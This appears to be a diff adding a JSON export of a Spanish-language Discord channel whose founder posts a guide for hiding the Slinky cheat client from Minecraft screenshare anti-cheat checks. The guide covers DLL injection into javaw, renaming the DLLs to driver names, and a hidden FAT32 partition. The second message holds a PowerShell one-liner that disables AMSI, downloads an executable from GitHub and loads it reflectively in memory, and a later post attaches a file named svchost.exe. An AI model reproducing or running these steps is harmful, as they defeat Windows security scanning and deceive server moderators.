@@ -1,0 +1,267 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1490913359317438564",
+    "type": "GuildTextChat",
+    "categoryId": "1479342865292460093",
+    "category": "metodos buenos",
+    "name": "»「\uD83E\uDEA2」bypass-slinky",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:16:18.6238299-03:00",
+  "messages": [
+    {
+      "id": "1490915784204226641",
+      "type": "Default",
+      "timestamp": "2026-04-07T00:27:02.83-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "bueno chavales como muchos sabran soy el fan numero 1 de slinky client y no es un cheat hecho para bypasear, pero aca les traigo un metodo bueno realmente, es el primer bypass del discord que se enfoca en un cheat en especifico\n\n\nlo primero que vamos a hacer es utilizar el metodo de #»「\uD83D\uDCBD」diskpart para crear un fat32 que no sea posible scanearlo con journal\n\ndentro de ese diskpart vamos a crear una carpeta  y le vamos a poner de nombre el siguiente caracter\n\n```ㅤ```\n\ndentro de esa carpeta vamos a meter nuestros dlls de slinky (slinky_library y slinkyhook)\n\nesto nos sirve ya que para que slinky se injecte  tiene que tener exactamente ese nombre, por lo cual no podemos utilizar un #»「\uD83D\uDD24」unicode , pero con este metodo cumplimos la misma funcion, bypaseamos todos los regex de spokwn, pftrace, cualquier prefetchparser, etc (el unico log es si buscamos exactamente el nombre en csrss)\n\n\nluego vamos a injectar slinky con systeminformer a javaw como lo hariamos de costumbre\n\ndespues van a ir a los dlls y los van a renamear a los siguientes nombres para que cuando se fijen en las modules de javaw, no salgan los de slinky: \natig6pxx.dll aticfx64.dll (no importa que nombre le pongan a cada uno, solo distribuyan esos renames)\n\nal estar en un fat32  que  no es scaneable por journal, no sale en ningun lado que renameamos estos dlls\n\npor ultimo vamos a utilizar este reflective asembly loading que elimina todas las strings de slinky en el juego (cuando dumpeamos memoria y ponemos slinky, autoclicker, aimassist, etc, elimina todo eso)",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [
+        {
+          "emoji": {
+            "id": "",
+            "name": "✅",
+            "code": "white_check_mark",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2705.svg"
+          },
+          "count": 1,
+          "users": [
+            {
+              "id": "1485080510257692904",
+              "name": "ssounder0541",
+              "discriminator": "0000",
+              "nickname": "Ssounder",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1485080510257692904/2cfbf93ba39a36b29c2dae5871509dff.png?size=512"
+            }
+          ]
+        },
+        {
+          "emoji": {
+            "id": "",
+            "name": "❤️",
+            "code": "heart",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2764.svg"
+          },
+          "count": 4,
+          "users": [
+            {
+              "id": "518227627174133761",
+              "name": "srstress",
+              "discriminator": "0000",
+              "nickname": "SrStress",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/518227627174133761/2a2eecc4c272a40f1351e4b2d0605211.png?size=512"
+            },
+            {
+              "id": "1092157367942135858",
+              "name": "juatoloco",
+              "discriminator": "0000",
+              "nickname": "ema",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1092157367942135858/8b85163edcd551d44a07afdca83858fa.png?size=512"
+            },
+            {
+              "id": "1341070699716149348",
+              "name": "sshvtp",
+              "discriminator": "0000",
+              "nickname": "sshv",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1341070699716149348/ffe44ff48dce6363417066abfa41f1b4.png?size=512"
+            },
+            {
+              "id": "1494939734605303810",
+              "name": "pleasewaiting",
+              "discriminator": "0000",
+              "nickname": "ranox",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1494939734605303810/a99e6014b4f9868bc0adbf85f770ec95.png?size=512"
+            }
+          ]
+        }
+      ],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1490915791883997184",
+      "type": "Default",
+      "timestamp": "2026-04-07T00:27:04.661-03:00",
+      "timestampEdited": "2026-04-07T00:32:42.001-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "```[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$bytes = (New-Object Net.WebClient).DownloadData('\nhttps://github.com/ccsgoq-byte/asdsa/raw/main/ConsoleApp1.exe')\n$asm = [Reflection.Assembly]::Load($bytes)\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\ntry { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::Run()```",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1490915954476056717",
+      "type": "Default",
+      "timestamp": "2026-04-07T00:27:43.426-03:00",
+      "timestampEdited": "2026-04-19T01:34:28.598-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "cuidado con el log que dejan en consolehost al utilizar el fileless que elimina las strings, y tambien cuando los frozeen NO tiren destruct a slinky, dejenlo bindeado a una tecla que los staffs no podrian tocar (como un boton del mouse extra) ya que si le tiran destruct  y el staff revisa unloaded modules, los dlls que renameamos anteriormente van a aparecer con su rename original\n\n\nun detalle que me olvide de agregar, si ustedes eliminan el diskpart con el slinky injectado,  los renames van a volver a llamarse slinky",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1490919306169680026",
+      "type": "Default",
+      "timestamp": "2026-04-07T00:41:02.532-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [
+        {
+          "id": "1490919305766768782",
+          "url": "https://cdn.discordapp.com/attachments/1490913359317438564/1490919305766768782/image.png?ex=6a34118e&is=6a32c00e&hm=05a53fd89bdbb4cdeed1606f979327bb3b1350b34b36c0121af59503be8e723d&",
+          "fileName": "image.png",
+          "fileSizeBytes": 114724
+        }
+      ],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1491205781494693908",
+      "type": "Default",
+      "timestamp": "2026-04-07T19:39:23.572-03:00",
+      "timestampEdited": "2026-04-07T19:39:36.5-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "tambien aca tienen otra alternativa para borrar strings por si el fileless de diff no les sirve bien (no comprobe si borra todas, esta si lo hace)\n\nignoren la gui de doomsday cleaner, borra las de slinky xd",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [
+        {
+          "id": "1491205780966342858",
+          "url": "https://cdn.discordapp.com/attachments/1490913359317438564/1491205780966342858/svchost.exe?ex=6a34739b&is=6a33221b&hm=2d76a9e6bb166c5c5034ad54d95b7c7f053cab8ab41322e08704fd0dbeea553a&",
+          "fileName": "svchost.exe",
+          "fileSizeBytes": 2752032
+        }
+      ],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 5
+}
